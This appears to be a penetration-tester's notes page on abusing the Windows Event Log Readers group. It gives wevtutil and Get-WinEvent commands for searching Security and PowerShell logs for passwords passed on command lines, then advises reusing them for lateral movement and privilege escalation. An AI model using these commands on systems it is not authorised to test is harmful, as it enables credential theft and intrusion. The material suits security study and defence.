### Event Log Readers
#### Summary

The Event Log Readers group allows its members to access Windows Event Logs, including logs that may capture sensitive data like command-line arguments of created processes (Event ID 4688). This can include credentials passed via command-line switches. Though primarily useful for auditing and monitoring, this group can become a valuable target for attackers during post-exploitation.
#### Privileges

- Read access to Event Viewer logs such as:
    - Security
    - PowerShell Operational
    - Application & System logs        
- Indirect access to sensitive data (e.g., passwords in command-line arguments)
#### Conditions

- Command-line auditing must be enabled:    
    - Audit Process Creation policy
    - `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit\ProcessCreationIncludeCmdLine_Enabled` = `1`    
- The target system must log Event ID 4688
#### Enumeration

Check local group membership:

```cmd
net localgroup "Event Log Readers"
```

Search Security Logs via `wevtutil`:

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

Search remotely with credentials:

```cmd
wevtutil qe Security /rd:true /f:text /r:<remotehost> /u:<user> /p:<password>
```

Search Security log using PowerShell:

```powershell
Get-WinEvent -LogName Security | 
    Where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | 
    Select-Object @{Name='CommandLine';Expression={ $_.Properties[8].Value }}
```

> ⚠️ _Membership in this group alone does NOT allow querying Security logs via PowerShell unless registry permissions on `HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security` are modified._
#### Exploitation

- Monitor logs to extract command-line credentials, especially for:    
    - `net use /user:password`
    - Tools executed via CLI that accept credentials as arguments
- If access to `Security` log is blocked:
    - Try reading `Windows PowerShell` logs (`Microsoft-Windows-PowerShell/Operational`) for script block logging if enabled:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"
```
#### Post-Exploitation

- Extract and document any discovered plaintext credentials    
- Use captured credentials for:
    - Lateral movement
    - Privilege escalation
    - Accessing file shares or remote services
#### Example

Captured from Security event logs:

```plaintext
Process Command Line: net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

Captured from PowerShell logs:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | 
    Select-Object -First 10
```
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Privileged_Groups 